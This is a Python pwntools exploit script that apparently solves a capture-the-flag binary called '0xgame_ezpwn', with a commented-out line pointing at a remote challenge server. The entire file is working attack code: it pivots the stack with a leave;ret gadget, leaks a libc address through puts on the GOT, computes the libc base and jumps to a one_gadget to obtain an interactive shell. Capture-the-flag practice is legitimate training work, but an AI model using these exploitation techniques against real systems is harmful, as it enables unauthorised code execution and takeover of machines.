from pwn import  *

elf = ELF('./0xgame_ezpwn')
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')

sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
context(arch = "amd64", os = "linux", log_level = "debug")

#sh = process(elf.path)
#sh = remote("121.4.15.155", 10008)
#gdb.attach(sh)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']
str_bin_sh = 0x18ce17
system = 0x453a0
main = 0x401194
vuln = 0x401167
pop_rdi_ret = 0x00000000004012a3
leave_ret = 0x0000000000401192
ret = 0x000000000040101a
one_gadget = 0xf1207

payload = p64(0x1000) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln)
sh.recvuntil("maybe...\n")
sh.sendline(payload)
sh.recvuntil("in ")
heap_addr = sh.recvuntil("\n")
heap_addr = int(heap_addr[:-1], 16)
print(hex(heap_addr))

payload = b'a' * 0x50 + p64(heap_addr) + p64(leave_ret)
sh.recvuntil("more\n")
sh.send(payload)

addr = sh.recvuntil('\x7f')
addr = u64(addr.ljust(8, b'\x00'))
print("puts got addr", hex(addr))
libc_base = addr - 0xf7310
print("libc base", hex(libc_base))
one = libc_base + one_gadget
print("one_gadget", hex(one))

payload = b'\x00' * 0x50 + p64(heap_addr + 0x50) + p64(one)
sh.recvuntil("more\n")
sh.send(payload)

sh.interactive()
